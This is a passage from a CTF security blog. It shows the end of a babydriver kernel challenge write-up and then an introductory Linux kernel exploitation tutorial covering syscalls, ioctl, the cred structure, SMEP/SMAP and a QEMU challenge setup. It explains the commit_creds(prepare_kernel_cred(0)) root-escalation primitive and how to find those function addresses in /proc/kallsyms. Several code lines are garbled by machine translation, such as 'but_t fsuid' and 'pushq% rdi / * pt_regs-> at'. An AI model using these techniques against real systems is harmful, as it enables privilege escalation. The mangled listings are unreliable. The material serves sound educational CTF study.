<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 127.0.0.1:9999</span><br></pre></td></tr></table></figure>

<p>运行如图</p>
<p><img src="/images/wp-babydriver-1.png"></p>
<p>先下个断点</p>
<p><img src="/images/wp-babydriver-2.png"></p>
<p>那么就和平时调试差不多了,只是调试相对比较慢而已, 下面就不演示了…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/15/wp-babydriver/" data-id="ckhemv81w002jwdcm2oqjgvod" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-kernel-pwn-knowledge-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/14/kernel-pwn-knowledge-1/" class="article-date">
  <time datetime="2020-09-14T12:26:47.000Z" itemprop="datePublished">2020-09-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/14/kernel-pwn-knowledge-1/">kernel pwn knowledge 1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Introduce some basic knowledge that Linux kernel pwn will use, and will gradually add it later.</p>
<p>Mainly refer to <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf">Linux Kernel Exploitation</a></p>
<h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>The kernel is also a program that manages the data I/O requirements issued by the software, escaping these requirements into instructions, and handing them over to the CPU and other components in the computer. The kernel is the most basic part of modern operating systems.</p>
<p><img src="/images/Kernel_Layout.svg" alt="Kernel_Layout"></p>
<p>The main function of the kernel is twofold:</p>
<ol>
<li>Control and interact with the hardware</li>
<li>Provide an environment in which the application can run</li>
</ol>
<p>Various functions including I/O, permission control, system call, process management, memory management, etc. can be attributed to the above two points.</p>
<p>It should be noted that the <strong>kernel crash usually causes a reboot</strong>.</p>
<h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>The intel CPU divides the privilege level of the CPU into four levels: Ring 0, Ring 1, Ring 2, Ring 3.</p>
<p>Ring0 is only used by the OS. All Ring 3 programs can be used. The inner ring can use the resources of the outer ring.</p>
<p>The Ring Model is used to improve system security. For example, a spyware as a user program running on Ring 3 will be blocked when the user is not notified, because the access hardware needs to use the Ring 1 reserved by the being driver. method.</p>
<p>Most modern operating systems use only Ring 0 and Ring 3.</p>
<h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>Loadable core modules (or directly called kernel modules) are like executable programs running in kernel space, including:</p>
<ul>
<li><p>Drivers</p>
</li>
<li><p>device driver</p>
</li>
<li><p>File system driver</p>
<ul>
<li>…</li>
</ul>
</li>
<li><p>kernel extension modules (modules)</p>
</li>
</ul>
<p>The file format of LKMs is the same as that of user mode. ELF under Linux, exe/dll under Windows, and MACH-O under mac, so we can use IDA and other tools to analyze kernel modules.</p>
<p>Modules can be compiled separately, but not separately. It is linked to the kernel as part of the kernel at run time, running in kernel space, unlike processes running on user controls.</p>
<p>Modules are often used to implement a file system, a driver, or other kernel-level functionality.</p>
<p>&gt; The Linux kernel provides a modular mechanism because it is itself a monolithic kernel. The advantage of a single core is that it is efficient because all the content is brought together, but the disadvantage is that the scalability and maintainability are relatively poor, and the module mechanism is to make up for this defect.</p>
<h3 id="Related-Instructions"><a href="#Related-Instructions" class="headerlink" title="Related Instructions"></a>Related Instructions</h3><ul>
<li><strong>insmod</strong>: Load the specified module into the kernel</li>
<li><strong>rmmod</strong>: Unload the specified module from the kernel</li>
<li><strong>lsmod</strong>: List the modules that have been loaded</li>
</ul>
<p>&gt; Most kernel vulnerability is also in LKM.</p>
<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>A system call is a program in which user space requests a service that requires higher privileges from the operating system kernel, such as IO operations or interprocess communication. The system call provides an interface between the user program and the operating system. Some library functions (such as scanf, puts, etc. IO related functions are actually the encapsulation (read and write) of the system call).</p>
<p>&gt; View 64-bit and 32-bit system calls in <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> and <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> respectively number.</p>
<p>&gt; Also recommend a very useful website <a target="_blank" rel="noopener" href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>, you can refer to the register meaning and source code of the 32-bit system call. Teachers are welcome to recommend 64-bit similar features.</p>
<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>Directly view the man page</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line"></span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line"></span><br><span class="line">       #include &lt;sys&#x2F;ioctl.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line"></span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of special</span><br><span class="line"></span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line"></span><br><span class="line">       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument</span><br><span class="line"></span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line"></span><br><span class="line">       an  untyped  pointer  to  memory.  It&#39;s traditionally char *argp (from the days</span><br><span class="line"></span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       An ioctl() request has encoded in it whether the argument is an in parameter or</span><br><span class="line"></span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line"></span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys&#x2F;ioctl.h&gt;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It can be seen that ioctl is also a system call for communicating with devices.</p>
<p>The first argument to <code>int ioctl(int fd, unsigned long request, ...)</code> is the [file descriptor] returned by the open device [open](<a target="_blank" rel="noopener" href="http://m4x.fun/post/play-with-file">http://m4x.fun/post/play-with-file</a> -descriptor-1/), the second parameter is the user program&#39;s control command for the device, and the latter parameter is some supplementary parameter, which is related to the device.</p>
<p>&gt; Reasons for communicating with ioctl:</p>
<p>&gt; The operating system provides kernel access to system calls to standard external devices, as most hardware devices can only be addressed directly within kernel space, but when accessing non-standard hardware devices these system calls are not appropriate, and sometimes user mode may need to be directly Access the device.</p>
<p>&gt; For example, a system administrator might want to modify the configuration of the NIC. Modern operating systems provide support for a wide variety of devices, and some devices may not be considered by the kernel designer, thus making it impossible to provide such a system call to use the device.</p>
<p>&gt; To solve this problem, the kernel is designed to be extensible, and a module called device driver can be added. The driver code allows it to run in kernel space and directly address the device. An Ioctl interface is a separate system call through which user space can communicate with device drivers. The device-driven request is an Ioctl call with the device and request number as parameters, so the kernel allows user space to access the device driver and access the device without knowing the specific device details, and does not require a lot of different devices. System call.</p>
<h2 id="Status-Switch"><a href="#Status-Switch" class="headerlink" title="Status Switch"></a>Status Switch</h2><h3 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h3><p>When a &#39;system call&#39;, <code>generate exception</code>, <code>peripheral generate interrupt</code>, etc. event occurs, the user mode to kernel mode switch occurs. The specific process is:</p>
<ol>
<li>Switch the GS segment register with <code>swapgs</code> to exchange the GS register value with the value of a specific location. The purpose is to save the GS value and use the value of this location as the GS value when the kernel is executed.</li>
<li>Record the current top of the stack (the top of the user space stack) in the CPU exclusive variable area, and put the top of the kernel stack recorded in the CPU exclusive area into rsp/esp.</li>
<li>Save each register value by push. The specific <a target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">code</a> is as follows:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">	 ENTRY(entry_SYSCALL_64)</span><br><span class="line"></span><br><span class="line">&#x2F;* SWAPGS_UNSAFE_STACK is a macro, x86 is directly defined as the swapgs command *&#x2F;</span><br><span class="line">​	 SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">​	</span><br><span class="line"></span><br><span class="line">&#x2F;* Save the stack value and set the kernel stack *&#x2F;</span><br><span class="line">​	 movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"></span><br><span class="line">	 movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​	</span><br><span class="line"></span><br><span class="line">​	</span><br><span class="line"></span><br><span class="line">&#x2F;* Save the register value by push to form a pt_regs structure*&#x2F;</span><br><span class="line">​	&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line"></span><br><span class="line">	pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">	</span><br><span class="line">	pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">	</span><br><span class="line">	pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">	</span><br><span class="line">	pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">	</span><br><span class="line">	pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">	</span><br><span class="line">	pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line"></span><br><span class="line">pushq% rdi &#x2F; * pt_regs-&gt; at * &#x2F;</span><br><span class="line">pushq% rsi &#x2F; * pt_regs-&gt; and * &#x2F;</span><br><span class="line">​	pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">Pushq %rcx tuichu &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">​	pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line"></span><br><span class="line">	pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line"></span><br><span class="line">pushq% r9 &#x2F; * pt_regs-&gt; r9 * &#x2F;</span><br><span class="line">​	pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line"></span><br><span class="line">	pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">	</span><br><span class="line">	sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>Determine if it is x32_abi by the assembly instruction.</li>
<li>Continue to execute the system call by jumping to the corresponding location of the global variable <code>sys_call_table</code> by the system call number.</li>
</ol>
<h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>When exiting, the process is as follows:</p>
<ol>
<li>Restore GS value by <code>swapgs</code></li>
<li>Resume to the user control via <code>sysretq</code> or <code>iretq</code> to continue execution. If you use <code>iretq</code> you also need to give some information about the user space (CS, eflags/rflags, esp/rsp, etc.)</li>
</ol>
<h2 id="structure-I-think"><a href="#structure-I-think" class="headerlink" title="structure I think"></a>structure I think</h2><p>As mentioned before, the kernel records the permissions of the process. More specifically, it is recorded by the cred structure. Each process has a cred structure. This structure saves the permissions of the process (uid, gid, etc.). Can modify the cred of a process, then modify the permissions of this process.</p>
<p><a target="_blank" rel="noopener" href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">source code</a> as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">​	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">​	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">but_t</span> fsuid; / * UID <span class="keyword">for</span> VFS ops * /</span><br><span class="line">​	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">​	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line"></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Kernel-state-function"><a href="#Kernel-state-function" class="headerlink" title="Kernel state function"></a>Kernel state function</h2><p>Kernel state functions have some changes compared to user state library functions</p>
<ul>
<li><p>printf() -&gt; <strong>printk()</strong>, but note that printk() does not necessarily display the content on the terminal, but it must be in the kernel buffer. You can view the effect via <code>dmesg</code></p>
</li>
<li><p>memcpy()        -&gt;        <strong>copy_from_user()/copy_to_user()</strong></p>
</li>
<li><p>copy_from_user() implements transferring user space data to kernel space</p>
</li>
<li><p>copy_to_user() implements transferring kernel space data to user space</p>
</li>
<li><p>malloc() -&gt; <strong>kmalloc()</strong>, kernel-mode memory allocation function, similar to malloc(), but using the <code>slab/slub allocator</code></p>
</li>
<li><p>free()        -&gt;        **kfree()**，同 kmalloc()</p>
</li>
</ul>
<p>Also note that the <code>kernel manages the process, so the kernel also records the permissions of the process</code>. There are two functions in the kernel that can easily change permissions:</p>
<ul>
<li><p><strong>int commit_creds(struct cred *new)</strong></p>
</li>
<li><p><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></p>
</li>
</ul>
<p>As you can see from the function name, execute <code>commit_creds(prepare_kernel_cred(0))</code> to get root privileges (root&#39;s uid, gid is 0)</p>
<p>Executing <code>commit_creds(prepare_kernel_cred(0))</code> is also the most commonly used method of lifting. The addresses of both functions can be viewed in <code>/proc/kallsyms</code> (the older kernel version is <code>/proc/ksyms</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">post sudo grep commit_creds /proc/kallsyms </span><br><span class="line"></span><br><span class="line">[sudo] m4x password:</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line"></span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line"></span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line"></span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line"></span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line"></span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line"></span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure>



<p>&gt; In general, the contents of /proc/kallsyms require root privileges to view</p>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>&gt; canary, dep, PIE, RELRO and other protections are the same as user principles</p>
<ul>
<li>smep: Supervisor Mode Execution Protection, when the processor is in <code>ring0</code> mode, executing the <code>userspace</code> code will trigger a page fault. (This protection is called <code>PXN</code> in arm)</li>
</ul>
<ul>
<li>smap: Superivisor Mode Access Protection, similar to smep, usually when accessing data.</li>
</ul>
<ul>
<li>mmap_min_addr:</li>
</ul>
<h2 id="CTF-kernel-pwn-Related"><a href="#CTF-kernel-pwn-Related" class="headerlink" title="CTF kernel pwn Related"></a>CTF kernel pwn Related</h2><p>Generally given the following three documents</p>
<ol>
<li><p>boot.sh: a script for starting the shell of the kernel, mostly using qemu, the protection measures are related to the different startup parameters of qemu</p>
</li>
<li><p>bzImage: kernel binary</p>
</li>
<li><p>rootfs.cpio: file system image</p>
</li>
</ol>
<p>such as:<br>​    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CISCN2017_babydriver [master]] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master ●] x baby driver.tar</span><br><span class="line">​	boot.sh</span><br><span class="line"></span><br><span class="line">	bzImage</span><br><span class="line">	</span><br><span class="line">	rootfs.cpio</span><br><span class="line"></span><br><span class="line">CISCN2017_babydriver [master]] ls</span><br><span class="line">​	babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line"></span><br><span class="line">	CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">	</span><br><span class="line">	bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) <span class="comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br><span class="line">	</span><br><span class="line">	CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">	</span><br><span class="line">	rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size 2844672</span><br><span class="line">	CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">	</span><br><span class="line">	boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line">CISCN2017_babydriver [master ●] bat boot.sh</span><br><span class="line">​	───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">	       │ File: boot.sh</span><br><span class="line">	</span><br><span class="line">	───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">	</span><br><span class="line">	   1   │ <span class="comment">#!/bin/bash</span></span><br><span class="line">	</span><br><span class="line">	   2   │ </span><br><span class="line">	</span><br><span class="line">	   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 ro</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	       │ ot=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 64M --nographi</span><br><span class="line">	</span><br><span class="line">	       │ c  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br><span class="line">	</span><br><span class="line">	───────┴─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Explain the parameters that qemu starts:<br>​    </p>
<ul>
<li>-initrd rootfs.cpio, using rootfs.cpio as the kernel-initiated file system</li>
<li>-kernel bzImage, using bzImage as the kernel image</li>
<li>-cpu kvm64, +smep, set the security options for the CPU, here smep is enabled</li>
<li>-m 64M, set the virtual RAM to 64M, the default is 128M<br>Other options can be viewed with –help.</li>
</ul>
<ol start="4">
<li>After writing the exploit locally, you can save the compiled binary file to the remote directory by base64 encoding, etc., and then get the flag.</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/kernel">Https://en.wikipedia.org/wiki/kernel</a></p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Classified">https://en.wikipedia.org/wiki/Classified</a> protection domain</p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Ioctl">https://zh.wikipedia.org/wiki/Ioctl</a></p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zqixiao_09/article/details/50839042">https://blog.csdn.net/zqixiao_09/article/details/50839042</a></p>
<p><a target="_blank" rel="noopener" href="https://yq.aliyun.com/articles/53679">https://yq.aliyun.com/articles/53679</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/14/kernel-pwn-knowledge-1/" data-id="ckhemv806000iwdcm232phdrg" class="article-share-link">Share</a>
      
      
